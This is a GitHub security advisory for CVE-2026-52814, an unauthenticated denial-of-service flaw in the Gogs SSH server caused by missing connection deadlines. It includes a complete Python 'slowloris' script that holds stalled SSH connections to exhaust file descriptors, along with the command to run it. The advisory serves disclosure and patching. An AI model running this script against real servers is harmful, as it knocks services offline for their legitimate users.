# [M] Gogs has Unauthenticated Asymmetric Denial of Service (DoS) via SSH Handshake Stall (File Descriptor Exhaustion)

## Summary
Severity: Medium
Advisory: GHSA-xp79-5mx3-jx52
CVE: CVE-2026-52814
CWE: CWE-400
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-xp79-5mx3-jx52
Type: github-advisory

## Affected
- Go: `gogs.io/gogs` — affected >=0 <0.14.3

## Details
The Gogs built-in Go SSH server is vulnerable to an unauthenticated, asymmetric Denial of Service (DoS) attack. The application accepts inbound TCP connections and passes them to `golang.org/x/crypto/ssh.NewServerConn` inside a new goroutine without enforcing any read/write deadlines on the underlying `net.Conn`.

An unauthenticated attacker can open multiple TCP connections to the SSH port and simply withhold the SSH protocol banner. This forces the server to spawn an unbounded number of goroutines that block indefinitely waiting for socket I/O. This leads to complete File Descriptor (FD) exhaustion, preventing legitimate users from accessing the Git SSH service, and ultimately destabilizing the entire Gogs process (e.g., causing internal log rotation failures).

### Vulnerability Details

In `internal/ssh/ssh.go`, the `listen` function contains an accept loop that spawns a goroutine for every incoming connection:

```go
for {
    conn, err := listener.Accept()
    // ...
    go func() {
        // VULNERABILITY: No conn.SetDeadline() is called here
        sConn, chans, reqs, err := ssh.NewServerConn(conn, config)
        // ...
    }()
}

```

The `golang.org/x/crypto/ssh` package is transport-agnostic and explicitly relies on the caller to manage connection timeouts before initiating the cryptographic handshake. Because Gogs never calls `conn.SetDeadline()`, the call to `NewServerConn` eventually reaches `io.ReadFull` (inside `readVersion()`) and blocks forever on the kernel TCP socket waiting for the client to send the `SSH-2.0-...` banner.

Each stuck connection consumes a file descriptor and ~10KB of memory (Goroutine stack + connection structs). An attacker holding thousands of these connections open with zero bandwidth (no data sent) will quickly exhaust the OS `ulimit -n` limits (`accept4: too many open files`), completely neutralizing the service.

### Steps to Reproduce

**1. Environment Setup:**
Ensure Gogs is configured to use the built-in Go SSH server in `app.ini`:

```ini
[server]
START_SSH_SERVER = true
SSH_PORT = 2222
SSH_LISTEN_PORT = 2222

```

**2. The Exploit (PoC):**
Save the following Python script as `slowloris-ssh.py`. This script connects to the SSH port and intentionally stalls the handshake.

```python
#!/usr/bin/env python3
import socket, sys, time

target_host = sys.argv[1]
target_port = int(sys.argv[2])
n = int(sys.argv[3])

sockets = []
print(f"[*] Starting SSH Slowloris on {target_host}:{target_port}...")

for i in range(n):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_host, target_port))
        # VULNERABILITY EXPLOIT: Do NOT send the "SSH-2.0-..." banner.
        sockets.append(s)
        if i % 100 == 0:
            print(f"[+] {i} stuck connections established")
    except Exception as e:
        print(f"[-] Stopped at {i} connections. Reason: {e}")
        break

print(f"[+] Holding {len(sockets)} connections to starve the server...")
while True:
    time.sleep(60)

```

**3. Execution:**
Run the script against the target, ensuring the number of connections (`n`) exceeds the server's configured file descriptor limit (e.g., `1500` for default 1024 ulimit environments):
`python3 slowloris-ssh.py <target-ip> 2222 1500`

**4. Observe the Impact:**

* Attempt to connect legitimately: `nc -v <target-ip> 2222`. The connection will hang or be refused immediately.
* Inspect the Gogs server logs/console. You will observe catastrophic I/O failures such as:
`[clog] [file]: rename rotated file ...: no such file or directory`
`accept4: too many open files`

### Impact

* **Denial of Service:** Legitimate developers cannot push, pull, or clone repositories via SSH.

### POC:-
[watch the following video for poc](https://drive.google.com/file/d/1YGsZnxNIiwUuOrdKwJSfnRBfOEJcDHUJ/view?usp=sharing)

## References
- https://github.com/gogs/gogs/security/advisories/GHSA-xp79-5mx3-jx52
- https://nvd.nist.gov/vuln/detail/CVE-2026-52814
- https://github.com/gogs/gogs/pull/8335
- https://github.com/gogs/gogs/commit/7da9cda314054501e1a7938a9c4d7896f331b884
- https://github.com/gogs/gogs
- https://github.com/gogs/gogs/releases/tag/v0.14.3
